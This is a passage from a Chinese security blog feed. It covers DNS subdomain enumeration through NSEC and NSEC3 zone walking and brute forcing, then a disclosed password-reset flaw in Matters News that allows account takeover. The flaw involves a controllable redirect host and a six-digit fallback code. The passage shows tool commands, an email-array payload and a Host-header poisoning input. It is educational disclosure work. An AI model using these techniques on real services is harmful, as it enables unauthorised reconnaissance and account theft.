服務的公司，都連帶成為受害者，任何子網域都無所遁形。供應鏈發生的弱點就會造成下游的風險，影響往往是倍數成長！</p>\n<h3 id=\"zone-walk\"><a class=\"direct-link\" href=\"#zone-walk\">#</a> zone walk</h3>\n<p>還記得我們之前介紹過的 DNSSEC 嗎？為了解釋信任鍊的原理，我們帶出了 DNSKEY、RRSIG、DS 這三種新紀錄，也留下了一個伏筆：『DNSSEC 能證明了我拿到的紀錄是真的，那能證明我沒拿到的紀錄是真的不存在嗎？』或是換句話說，當我查不到紀錄的時候，是真的沒有這筆紀錄，還是紀錄被攻擊者故意騙我說不存在呢？</p>\n<p>為了解決這個問題，DNSSEC 其實還有一種新的紀錄：NSEC。</p>\n<p>NSEC 要表達的是：這是所有紀錄排序後，在我下一個的網域，所以，在我們之間沒有其他網域了。NSEC 等同於在一條線上標示出所有存在的點，然後從這些點上一刀切下去，把線分成好多個線段。我們用一個例子說明吧。</p>\n<p>假設公司 <code>cymetrics.com</code> 的 zone 裡只有四個子網域，前綴分別為 crystal, huli, jo, nick，那它的 NSEC 記錄們會長的像下面這樣，在排序後用一個 linked list 的方式串接起來：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">cymetrics.com.          300\tIN\tNSEC\tcrystal.cymetrics.com.    A SOA RRSIG NSEC<br>crystal.cymetrics.com.  300\tIN\tNSEC\thuli.cymetrics.com.       A NS RRSIG NSEC<br>huli.cymetrics.com.     300\tIN\tNSEC\tjo.cymetrics.com.         A MX RRSIG NSEC<br>jo.cymetrics.com.       300\tIN\tNSEC\tnick.cymetrics.com.       A TXT RRSIG NSEC<br>nick.cymetrics.com.     300\tIN\tNSEC\tcymetrics.com.            A TXT RRSIG NSEC</code></pre>\n<p>於是今天，當有人想找 <code>david.cymetrics.com</code> 的時候，我們就可以給他第二筆紀錄，告訴他： <code>david</code> 不存在哦，但是他的前一個是 <code>crystal</code> 後一個是 <code>huli</code>。<br>\n反之，當有人要找 <code>huli.cymetrics.com</code> 的時候，就沒辦法騙人了。攻擊者當然不想給真正的紀錄，那要怎麼從 NSEC 裡面選一個呢？攻擊者不能回第二或第三筆紀錄，因為 <code>huli.cymetrics.com</code> 明顯就是端點之一，一定存在；但他也不能回其他三筆紀錄，因為 <code>huli</code> 並不在 <code>crystal</code> 之前、<code>jo</code> 到 <code>nick</code> 之間、或 <code>nick</code> 之後，所以不適用任何記錄標示的範圍內。沒有一筆紀錄邏輯成立，DNS resolver 就能偵測有人在作祟。</p>\n<p>那如果請求的網域存在，但是請求的紀錄類型不存在呢？例如，我想要 <code>nick.cymetrics.com</code> 的 MX 紀錄，但這個網域下沒有，該如何證明？</p>\n<p>再回去看上面的 NSEC 記錄們，你會發現最尾巴有一串紀錄類型的字串，這就代表了這個 NSEC 擁有者<strong>有</strong>的紀錄，所以當你請求的網域跟紀錄類型沒有剛好的 match 的時候，DNS 一樣會回覆你這筆 NSEC，表示：找不到你請求的東西，不過我這裡有 <code>nick.cymetrics.com</code> 的 A TXT RRSIG NSEC 紀錄喔！同理，這樣攻擊者也沒辦法故意不給某一種類型的紀錄，因為 DNS resolver 從 NSEC 裡面就可以判斷紀錄是否真實存在了。</p>\n<p>因為有 DNSSEC，在無法偽造或竄改記錄的前提下，NSEC 提供了 DNS 紀錄的不在場證明。DNS resolver 只要驗證 NSEC 的區間範圍與存在的紀錄類型，就可以判斷請求的目標是不是真的存在，解決的上面提出的困擾。</p>\n<p>有這麼值得信賴的機制，豈不是一大福音？既然所有真的存在的網域都用 NSEC 串在一起了，我們只要順藤摸瓜，用遞迴的方式一直查詢下去直到繞回原點，就可以枚舉出所有存在的網域了啊！</p>\n<p>用 dig 看一下之前的 <code>dnstests.ovh</code> 長這樣：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">$ dig nsec dnstests.ovh<br>dnstests.ovh.\t\t60\tIN\tNSEC\tsubdomain.dnstests.ovh. A NS SOA RRSIG NSEC DNSKEY<br><br>$ dig nsec subdomain.dnstests.ovh<br>subdomain.dnstests.ovh.\t60\tIN\tNSEC\twww.dnstests.ovh. A TXT RRSIG NSEC<br><br>$ dig nsec www.dnstests.ovh<br>www.dnstests.ovh.\t60\tIN\tNSEC\tdnstests.ovh. A RRSIG NSEC</code></pre>\n<p>要自己寫程式也可以，不過已經有工具能幫我們做到這件事了：<code>ldns-walk</code></p>\n<pre class=\"language-txt\"><code class=\"language-txt\">ldns-walk @&lt;nameserver> &lt;domain><br><br># try with larger domain<br>$ ./ldns-walk @router.tms.com.tw tms.com.tw<br>tms.com.tw.\ttms.com.tw. A NS SOA MX TXT RRSIG NSEC DNSKEY <br>_acme-challenge.tms.com.tw. TXT RRSIG NSEC <br>_dmarc.tms.com.tw. TXT RRSIG NSEC <br>12949916._domainkey.tms.com.tw. TXT RRSIG NSEC <br>ftp.tms.com.tw. A RRSIG NSEC <br>loopback.tms.com.tw. CNAME RRSIG NSEC <br>router.tms.com.tw. A RRSIG NSEC <br>smtp1.tms.com.tw. A RRSIG NSEC <br>_acme-challenge.webmail.tms.com.tw. TXT RRSIG NSEC <br>www.tms.com.tw. A RRSIG NSEC </code></pre>\n<p>是不是很方便呢？馬上就可以拿到一張列表啦！我開心，你開心，但有人又不開心了。</p>\n<p>對想收集資料的攻擊者如此友善，不也是一種資安漏洞嗎？而且說不定我的 zone 裡有一些不想揭露的網域啊？</p>\n<p>有鑑於此，NSEC3 誕生了。跟原先的 NSEC 相比，NSEC3 為了防止 zone walk 加入了 hash 這個步驟，讓原本的網域名稱加了一層面具。以我們剛剛範例的網域來說，假設 hash 完的結果對應如下（這裡只取前面幾個位元）：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">cymetrics.com.          -> FOS7E3K<br>crystal.cymetrics.com.  -> O8H5F0P<br>huli.cymetrics.com.     -> QEE453Y<br>jo.cymetrics.com.       -> VS75HE2<br>nick.cymetrics.com.     -> LCA56W1</code></pre>\n<p>那做成 NSEC3 就會是</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">FOS7E3K     300\tIN\tNSEC    1 0 10 1234567890ABCDEF     LCA56W1     A SOA RRSIG NSEC<br>LCA56W1     300\tIN\tNSEC    1 0 10 1234567890ABCDEF     O8H5F0P     A TXT RRSIG NSEC<br>O8H5F0P     300\tIN\tNSEC    1 0 10 1234567890ABCDEF     QEE453Y     A NS RRSIG NSEC<br>QEE453Y     300\tIN\tNSEC    1 0 10 1234567890ABCDEF     VS75HE2     A MX RRSIG NSEC<br>VS75HE2     300\tIN\tNSEC    1 0 10 1234567890ABCDEF     FOS7E3K     A TXT RRSIG NSEC</code></pre>\n<p>其中，<code>1 0 10 1234567890ABCDEF</code> 這段的四個數字分別代表了 hash 用的演算法、opt out flag、iteration 次數、跟 salt，計算 hash 時會用到。關於 NSEC3 的細節與設置不在這次探討範圍內，有興趣的可以參考 DNS Institute 的介紹：<a href=\"https://dnsinstitute.com/documentation/dnssec-guide/ch06s02.html\">機制</a>、<a href=\"https://dnsinstitute.com/documentation/dnssec-guide/ch07s03.html\">配置</a>。</p>\n<p>這下，當有人詢問 <code>david.cymetrics.com</code> 的時候，我們就會先把 <code>david.cymetrics.com</code> 做一次 hash，假設得到 R3K6GS，再把 R3K6GS 拿去對應 NSEC3 發現它落在 LCA56W1 到 O8H5F0P 之間，於是回應上面的第二筆紀錄。攻擊者不能像之前一樣簡單的列舉網域，因為他就算知道了 LCA56W1 跟 O8H5F0P 這兩個端點，卻反推不出他們 hash 前本來是什麼網域，沒辦法再往下查了。</p>\n<p>有了 NSEC3，我們無法像剛剛那樣，順藤摸瓜把網域們一個連一個撈出來，而就算我們能列舉出所有的網域，也都是看不懂的 hash。</p>\n<p>那怎麼辦？這樣我們就沒辦法了嗎？</p>\n<p>對，這樣我們就真的沒辦法直接得到網域的名字了。不過，這並不代表我們就無計可施。用 hash 只是換一個難以辨識的別名，但標示區間的概念還是一樣的！</p>\n<p>換個方式想，不能順藤摸瓜，我們可以亂槍打鳥。丟一個名字過去，就能得到包夾他的兩個端點所構成的區間，再丟一個會落在區間外的點，就可以再獲得一筆資訊，如此就可以慢慢重建出所有存在的網域的 hash 清單。</p>\n<p>以前面的紀錄為例，我們可以看看下面這張圖。第一次試了 <code>david.cymetrics.com</code> 後我們會得到 LCA56W1 跟 O8H5F0P，同時還有產生 hash 用的參數，於是在虛線上可以標出兩個點。為了探索右邊的未知區域，我們選了 hash 後開頭是 W 的 <code>james.cymetrics.com</code>，並得到 VS75HE2 跟 FOS7E3K 兩個點，剩下兩大塊未知區域。再來我們用 hash 後開頭是 H 的 <code>ferb.cymetrics.com</code> 再試一次，這次是得到 FOS7E3K 跟 LCA56W1，剛剛這兩個點我們都知道了，所以線段接起來了，中間沒有其他網域！特別說明一下虛線應該用一個圓周來表示比較好，因為頭尾是相接的，不過用 slides 畫畫有點麻煩，請多包涵 XD。至此我們已經成功得到四個網域 hash 過的名稱，只要對著剩下未知的 O8H5F0P 到 VS75HE2 亂槍打鳥多試幾次，就可以把整個圓周兜出來了！</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/nsec3.png\" /><figcaption><p>NSEC3 walk</p>\n</figcaption></figure></p>\n<p>有了網域名清單，剩下的就是找出 hash 之前的名字，這部分就只能暴力破解了，拿一個很大的字典檔當子網域的前綴，然後逐一 hash 再比對找到吻合的紀錄。這一整個方法其實也有工具做好了：<a href=\"https://dnscurve.org/nsec3walker.html\">nsec3walker</a>，用法也很簡單</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># collect domains under target.domain and output</span><br>./collect target.domain <span class=\"token operator\">></span> target.domain.collect<br><br><span class=\"token comment\"># unhash collected domains</span><br>./unhash <span class=\"token operator\">&lt;</span> target.domain.collect <span class=\"token operator\">></span> target.domain.unhash</code></pre>\n<h3 id=\"brute-forcing\"><a class=\"direct-link\" href=\"#brute-forcing\">#</a> brute-forcing</h3>\n<p>最後就是暴力破解啦！這個跟剛剛的 NSEC3 有點像，就是用字典檔建構出可能的子網域，不過這裡不是在本機上運算，而是逐一拿去向 authoritative DNS 詢問，看看到底哪些存在。</p>\n<p>暴力破解會遇到兩個問題。</p>\n<p>第一個是你的字典檔選得不好，例如大多網站可能都有 <code>www.</code> 這個子網域，但偏偏你的字典檔漏掉了，那不管你怎麼跑都不可能找到這個結果。或是網域名稱可能加上了一些變形，例如他用的是 <code>tw2021.</code> 或 <code>tw2019.</code>，那就算你的字典檔裡有 <code>tw</code> 也一樣找不到，或是他的子網域會加上某個字串，例如除了 <code>web.</code>、<code>internal.</code> 還用 <code>web-uat.</code>、<code>internal-sit.</code> 等。</p>\n<p>要解決這個問題有兩層方向，第一是選一個好一點的字典檔，例如我自己用的是 <a href=\"https://github.com/assetnote/commonspeak2-wordlists\">commonspeak2</a> ，其他還有大佬 Jason Haddix 整合多個字典檔而成的 <a href=\"https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056\">all.txt</a> 跟專門收藏字典檔的 <a href=\"https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS\">Seclists</a>。好或不好、夠或不夠，我覺得看你的需求而定，畢竟不可能有一個字典檔是真的百發百中，也許你的目標網域的命名就是用一些不一樣的命名。第二層是用工具幫你產生 mutations 來擴充你的字典檔，例如加上時間日期或是某個特定的字串，但我覺得這個比較適用於你已經知道某些子網域命名的規律的情況下了，因為你的字典檔大小倍數增長，表示你要花的時間也是倍數增長，所以盲目的變形不會是最有效率的做法。</p>\n<p>第二個會遇到的問題是，字典檔太大，跑起來要花太久了。假設你要測 10000 個子網域，但一秒只能跑 10 個 DNS query，就表示你要花 16 多分鐘才能跑完，而一個不大的字典檔至少包含十萬筆資料，你要等的時間是以小時計算的，跑完約 48 萬筆資料的 commonspeak2 都過半天了。我用的 DNS resolver 是 <a href=\"https://github.com/blechschmidt/massdns\">massDNS</a>，如果網路速度跟對方的 authoritative DNS 回應不要太慢，在幾分鐘內就可以把 commonspeak2 跑完，真的是神速。</p>\n<p>不可否認，brute-forcing 是一個簡單粗暴又有效的方法，雖然非常吵雜，行蹤馬上就會被發現，而且會產生非常大的流量，本質上就是我們前一篇講的服務阻斷攻擊。也因此，有些時候會被對方的 authoritative DNS 擋下來或列入黑名單，也可能會被當成是殭屍網路關注，例如我之前測試後就有被電信公司通知說偵測到 IP 有異常 DNS 流量 XDDD</p>\n<h2 id=\"%E4%BE%86%E8%87%AA%E5%8B%95%E5%8C%96%E5%90%A7\"><a class=\"direct-link\" href=\"#%E4%BE%86%E8%87%AA%E5%8B%95%E5%8C%96%E5%90%A7\">#</a> 來自動化吧</h2>\n<p>其實要做 subdomain enumeration，現成的工具很多了，包括很有名的 <a href=\"https://github.com/OWASP/Amass\">OWASP Amass</a>、<a href=\"https://github.com/aboul3la/Sublist3r\">Sublist3r</a>、<a href=\"https://github.com/projectdiscovery/subfinder\">Subfinder</a> 等等，都整合了數十種 passive recon 的資料來源，雖然很多需要自己去申請 API key 才能拉到資料，但的確已經節省了非常多手動的功夫。而像是 <a href=\"https://github.com/darkoperator/dnsrecon\">DNSRecon</a>、<a href=\"https://github.com/TheRook/subbrute\">SubBrute</a>、<a href=\"https://github.com/TypeError/domained\">Domained</a> 等 active recon 跟 brute force 工具，其實也結合了好幾個其他的開源專案，來讓網域資料搜集盡可能一鍵解決。</p>\n<p>我自己的自動化工具，重點其實是找到子網域後的進一步檢查，來幫我快速找到可以通報 bug bounty 的設定漏洞，所以前面收集子網域的步驟也是仰賴這些開源專案組合而成的。我的作法是，把 passive recon、active recon、brute-forcing 的結果都先收成一個候選網域清單，再一次丟到 DNS resolver 裡面找到真實存在、連線得到的。</p>\n<p>如下圖所示，用 Amass 做 passive recon 來拉到有公開紀錄跟相關的網域（Amass 也有 active recon 哦）、做 zone transfer 跟 zone walk 的檢查、用 commonspeak2 建構字典檔，然後結合起來丟到 massDNS 裡面 resolve。</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/workflow.png\" /><figcaption><p>workflow</p>\n</figcaption></figure></p>\n<p>這個架構其實是取自 Patrik Hudak 的 <a href=\"https://0xpatrik.com/subdomain-enumeration-2019/\">Subdomain Enumeration: 2019 Workflow</a>，重點在擷取 Amass 在 passive recon 的優勢、commonspeak2 不算太大但效果還不錯、還有 massDNS 飛快的 resolve 速度。Amass 雖然能一次統整大量的 source 得到大批候選清單，但 DNS resolver 的速度就比較慢了，而且 massDNS 除了能單純過濾出真實存在（有 A/CNAME 紀錄）的網域之外，還可以指定要 resolve 其他類型紀錄，這種各司其職的模式對於我後續檢查弱點來說比較有彈性。</p>\n<p>當然除了這些，你也可以參考 Patrik Hudak 的作法，在 massDNS 做完後考慮用 <a href=\"https://github.com/infosec-au/altdns\">Altdns</a> 對結果加上一些變形再拿去 massDNS 做一次，因為已知存在的網域也許會在不同環境、時間、用途之下有些許命名差異，這麼做可能可以幫你挖到一些隱藏起來的網域。第二次才加變形的好處是你前面的第一批候選清單不會倍數放大爆炸，而且確定存在的網域才比較可能有兄弟姐妹存在。</p>\n<p>當然，這只是我自己的作法，還有很多開源專案值得參考借鏡，建立符合你需求的自動化組合最重要。另外，字典檔的選擇也可以多試試幾種，或是結合幾個你自己用起來最有效的！</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>這次我們聊到 subdomain enumeration 的幾種技巧跟資源，不過其實還有很多沒介紹到的小地方，例如從辨識 AS 去找到對應的 IP netblocks 再反過來找 domain，還有許多線上跟網路相關的資料庫或是 wayback machine 等，都可能藏著不為人知的網域。推薦可以看看 Amass 整合的來源們，也許會有新的收穫或靈感喔。</p>\n",
      "date_published": "2022-01-12T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/reset-password-vulnerability/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/reset-password-vulnerability/",
      "title": "有缺陷的重設密碼機制如何演變成帳號奪取漏洞？以 Matters 為例",
      "content_html": "<!-- summary -->\n<!-- 重設密碼是幾乎所有網站都有的機制，但如果設計不當，就有可能變成能夠讓攻擊者奪取他人帳號的漏洞，這篇將以實際案例說明以及探討這個問題 -->\n<!-- summary -->\n<p>重設密碼是幾乎所有網站都有的機制，最常見的是透過 email 寄送一個重設密碼的連結，點進去連結以後就可以幫這個帳號設定新的密碼。這個機制雖然常見，卻有一些關於安全性的小細節要注意。</p>\n<p>這次要來寫的，是我在今年六月底的時候回報的由重設密碼功能引起的帳號奪取（account takeover）漏洞。</p>\n<p><a href=\"https://matters.news/\">Matters News</a> 是一個去中心化而且應用加密貨幣相關技術的寫作社群平台，我以前曾經寫過一篇<a href=\"https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/\">《防止 XSS 可能比想像中困難》</a>分享我怎麼找到他們的 XSS 漏洞。</p>\n<p>在談這次的漏洞之前，我們先來看看一般重設密碼的功能是如何設計的。</p>\n<p>話說，如果你好奇為什麼密碼只能重設，而不是「找回密碼」，可以先參考這一篇：<a href=\"https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/\">為什麼忘記密碼時只能重設，不把舊密碼告訴我？</a></p>\n<h2 id=\"%E5%85%B8%E5%9E%8B%E7%9A%84%E9%87%8D%E8%A8%AD%E5%AF%86%E7%A2%BC%E5%8A%9F%E8%83%BD\"><a class=\"direct-link\" href=\"#%E5%85%B8%E5%9E%8B%E7%9A%84%E9%87%8D%E8%A8%AD%E5%AF%86%E7%A2%BC%E5%8A%9F%E8%83%BD\">#</a> 典型的重設密碼功能</h2>\n<p>基本上忘記密碼的流程都大同小異，不外乎就是：</p>\n<ol>\n<li>使用者填入當初註冊帳號時的 email</li>\n<li>系統寄送重設密碼的連結到第一步的 email</li>\n<li>使用者點擊信中的連結，前往重設密碼頁面</li>\n<li>使用者輸入新的密碼，送出表單</li>\n<li>密碼重設成功，使用者可以利用新的密碼登入</li>\n</ol>\n<p>這個流程如果要是安全的，就必須確保：</p>\n<ol>\n<li>系統寄送信件的目的地，真的是使用者本人的 email</li>\n<li>重設密碼的連結無法被猜出來</li>\n</ol>\n<p>先來談談第一點，有些人會想說：「這不是很基本嗎？我填入 <a href=\"mailto:user@example.com\">user@example.com</a>，當然是把信件寄送給 <a href=\"mailto:user@example.com\">user@example.com</a> 啊！」</p>\n<p>不不不，這可不一定，有些系統在接收 email 這個參數時，居然可以是一個陣列，所以你可以填入：<code>[&quot;victim@example.com&quot;, &quot;attacker@example.com&quot;]</code>，然後 attacker 就會收到 victim 的重設密碼信件！</p>\n<p>聽起來很不可思議，但確實發生過：</p>\n<ol>\n<li><a href=\"https://hackerone.com/reports/322985\">Ability to reset password for account</a></li>\n<li><a href=\"https://hackerone.com/reports/1175081\">Full account takeover of any user through reset password</a></li>\n</ol>\n<p>再來談談第二點，如果重設密碼的連結可以被猜出來，就代表攻擊者可以代替 user 重設密碼。</p>\n<p>或更精確地說，重設密碼的 token 不能被猜出來。</p>\n<p>舉例來說，如果重設密碼的連結長得像這樣：<code>https://example.com/reset-password?token=user@example.com</code>，那我就可以幫任何人重設密碼了，顯然很不安全。</p>\n<p>所以一般來說，token 都會產生一組 unique id，例如說 UUID v4，長得像這樣：<code>2c59d26a-f99a-425e-bb69-91e7c6ffe54d</code>，有 128 個 bit，也就是 2^128 種組合，要猜中的可能性微乎其微。</p>\n<p>若是產生的 token 強度不夠的話，就會提高暴力破解成功的機率。</p>\n<p>不過要特別注意的是儘管如此，有些系統的漏洞在其他地方，例如說寄送 email 時，重設密碼的網址或是 host 是可以控制的！像是只要在 request header 裡面加上 <code>X-Forwarded-Host: abc.com</code>，重設密碼的連結就會變成：<code>https://abc.com/reset-password?token=...</code>，使用者收到信以後如果不小心點了連結，這個 token 就會發到攻擊者的伺服器去，他一樣可以利用這個 token 來重設密碼，進行帳號奪取。</p>\n<p>這也是有發生過實際案例的：</p>\n<ol>\n<li><a href=\"https://hackerone.com/reports/226659\">Password Reset link hijacking via Host Header Poisoning</a></li>\n<li><a href=\"https://hackerone.com/reports/182670\">Email link poisoning / Host header attack</a></li>\n</ol>\n<p>除了這些以外，其實還有許多小細節要注意，例如說：</p>\n<ol>\n<li>重設密碼的 token 應該只能使用一次</li>\n<li>重設密碼的 token 應該要有過期時間</li>\n<li>如果使用者產生了新的重設密碼 token，舊的應該要廢棄</li>\n</ol>\n<p>之所以會有這些限制，也是為了降低暴力破解的可行性。</p>\n<p>假設時間無限的話，理論上暴力破解絕對可以猜出 token，因此防止暴力破解的重點有兩個，一個是盡量增加破解所需的時間，讓這個時間大到超過一千年或更久，第二個重點是限制時間，而實際的方法有幾種，例如說：</p>\n<ol>\n<li>把基數加大，例如說六碼數字的可能性只有一百萬種，但若是換成六碼英文加數字就有 20 億種，要猜測的數量多了 2000 倍，就需要花更多時間</li>\n<li>把可猜測的時間降低，例如說 300 秒後 token 就會過期，假設可能性有 1 億種，那每秒必須要猜 30 萬種才能保證猜中</li>\n</ol>\n<p>接著，我們就來看一下 Matters 的重設密碼機制出了什麼事情。</p>\n<h2 id=\"matters-%E7%9A%84%E9%87%8D%E8%A8%AD%E5%AF%86%E7%A2%BC%E6%A9%9F%E5%88%B6\"><a class=\"direct-link\" href=\"#matters-%E7%9A%84%E9%87%8D%E8%A8%AD%E5%AF%86%E7%A2%BC%E6%A9%9F%E5%88%B6\">#</a> Matters 的重設密碼機制</h2>\n<p>下圖是 Matters 重設密碼的畫面，一樣是填入 email，然後寄一個連結到信箱：</p>\n<p><img src=\"/img/posts/huli/reset-password-vulnerability/matters.png\" alt=\"\"></p>\n<p>重設密碼的 request 長這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">{</span><br>   <span class=\"token string\">\"operationName\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"SendVerificationCode\"</span><span class=\"token punctuation\">,</span><br>   <span class=\"token string\">\"variables\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>      <span class=\"token string\">\"input\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>         <span class=\"token string\">\"email\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"user@example.com\"</span><span class=\"token punctuation\">,</span><br>         <span class=\"token string\">\"type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"password_reset\"</span><span class=\"token punctuation\">,</span><br>         <span class=\"token string\">\"redirectUrl\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"https://matters.news/forget?email=user%40example.com\"</span><br>      <span class=\"token punctuation\">}</span><br>   <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這是我收到的連結：<code>https://matters.news/forget?email=user%40example.com&amp;code=UYBQ912rhd_9s3TfywZnk1kQl6PCaDjPlXuNX3Df&amp;type=password_reset</code></p>\n<p>從這邊其實我們就可以發現第一個問題，就是看起來收到的連結的前半段是由 <code>redirectUrl</code> 所控制的。如果我們攔截 request 以後修改 <code>redirectUrl</code> 參數，修改成 <code>https://cymetrics.io</code>，會發現信箱內收到的連結確實變成由 <code>https://cymetrics.io</code> 開頭！</p>\n<p>如此一來，就有了前面所說的漏洞，如果使用者點了信中的連結，那我們的 server 就會收到 token，就可以幫使用者重設密碼。</p>\n<p>接著我們看一下有沒有暴力破解的問題，token 本身看起來複雜度滿高的，長度是 40 個字，由大小寫英文字母、數字以及底線所組成。</p>\n<p>雖然看起來應該不會有問題，但 Matters 是開源的，所以我們可以直接去看一下 <code>SendVerificationCode</code> 是如何實作的，程式碼在這邊：<a href=\"https://github.com/thematters/matters-server/blob/v3.19.0/src/mutations/user/sendVerificationCode.ts\">https://github.com/thematters/matters-server/blob/v3.19.0/src/mutations/user/sendVerificationCode.ts</a></p>\n<p>我們關注的是產生 code 的地方，主要是這一段：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// insert record</span><br><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> code <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> userService<span class=\"token punctuation\">.</span><span class=\"token function\">createVerificationCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>  userId<span class=\"token operator\">:</span> viewer<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span><br>  email<span class=\"token punctuation\">,</span><br>  type<span class=\"token punctuation\">,</span><br>  strong<span class=\"token operator\">:</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span>redirectUrl<span class=\"token punctuation\">,</span> <span class=\"token comment\">// strong random code for link</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre>\n<p>而這個 <code>userService.createVerificationCode</code> 的程式碼則是在這裡：<a href=\"https://github.com/thematters/matters-server/blob/v3.19.0/src/connectors/userService.ts#L1500\">https://github.com/thematters/matters-server/blob/v3.19.0/src/connectors/userService.ts#L1500</a></p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token function-variable function\">createVerificationCode</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">{</span><br>  userId<span class=\"token punctuation\">,</span><br>  email<span class=\"token punctuation\">,</span><br>  type<span class=\"token punctuation\">,</span><br>  strong<span class=\"token punctuation\">,</span><br>  expiredAt<span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>  userId<span class=\"token operator\">?</span><span class=\"token operator\">:</span> string <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><br>  email<span class=\"token operator\">:</span> string<br>  type<span class=\"token operator\">:</span> string<br>  strong<span class=\"token operator\">?</span><span class=\"token operator\">:</span> boolean<br>  expiredAt<span class=\"token operator\">?</span><span class=\"token operator\">:</span> Date<br><span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> code <span class=\"token operator\">=</span> strong <span class=\"token operator\">?</span> <span class=\"token function\">nanoid</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> _<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">)</span><br><br>  <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">baseCreate</span><span class=\"token punctuation\">(</span><br>    <span class=\"token punctuation\">{</span><br>      uuid<span class=\"token operator\">:</span> <span class=\"token function\">v4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>      userId<span class=\"token punctuation\">,</span><br>      email<span class=\"token punctuation\">,</span><br>      type<span class=\"token punctuation\">,</span><br>      code<span class=\"token punctuation\">,</span><br>      expiredAt<span class=\"token operator\">:</span><br>        expiredAt <span class=\"token operator\">||</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span>Date<span class=\"token punctuation\">.</span><span class=\"token function\">now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token constant\">VERIFICATION_CODE_EXIPRED_AFTER</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">'verification_code'</span><br>  <span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>從這邊我們看到一個重點，就是在系統內 code 的產生分兩種類型，strong 的是 <code>nanoid(40)</code>，不 strong 的則是 100000~999999 的六碼數字，而這個 strong 的參數是由有沒有傳入 <code>redirectUrl</code> 而決定的。</p>\n<p>也就是說，如果我們在建立 reset password 的驗證碼時把 <code>redirectUrl</code> 參數拿掉，code 就會從原本的 40 個字，瞬間降低成六位數的數字！</p>\n<p>而驗證碼的過期時間 <code>VERIFICATION_CODE_EXIPRED_AFTER</code> 是五分鐘，也就是 300 秒，900000/300 = 3000，只要我們一秒能發送 3000 個 request 到 server，就能暴力破解 reset password 的 token，進而奪取使用者帳號。</p>\n<p>但其實這樣的說法不太精確，因為我們可以發 3000 個，不代表 server 就可以處理 3000 個，所以還要看 server 能接受的 request 數量，而且在這之前，還有另一個限制要繞過。</p>\n<h2 id=\"rate-limiting\"><a class=\"direct-link\" href=\"#rate-limiting\">#</a> Rate limiting</h2>\n<p>增加暴力破解難度的方法之一就是 rate limiting，許多網站或是 WAF 都有這個功能，能夠阻止短時間內大量的 request。</p>\n<p>而 Matters 的 rate limit 是用 nginx 來處理，程式碼在這裡：<a href=\"https://github.com/thematters/matters-server/blob/v3.19.0/.ebextensions/rate-limit-connections.config\">https://github.com/thematters/matters-server/blob/v3.19.0/.ebextensions/rate-limit-connections.config</a></p>\n<pre><code>limit_req_zone $http_x_forwarded_for zone=application:16m rate=5r/s;\n<p>limit_req zone=application burst=20 nodelay;<br>\nlimit_req_status 429;<br>\nlimit_conn_status 429;</p>\n<h1 id=\"pass-real-ip-from-client-to-nginx\"><a class=\"direct-link\" href=\"#pass-real-ip-from-client-to-nginx\">#</a> pass real IP from client to NGINX</h1>\n<p>real_ip_header X-Forwarded-For;<br>\nset_real_ip_from 0.0.0.0/0;</p>\n<p>server {<br>\n# set error page for HTTP code 429<br>\nerror_page 429 @ratelimit;<br>\nlocation @ratelimit {<br>\nreturn 429 '[&quot;Connection Limit Exceeded&quot;]\\n';<br>\n}</p>\n<pre><code>listen 80;\n\n# 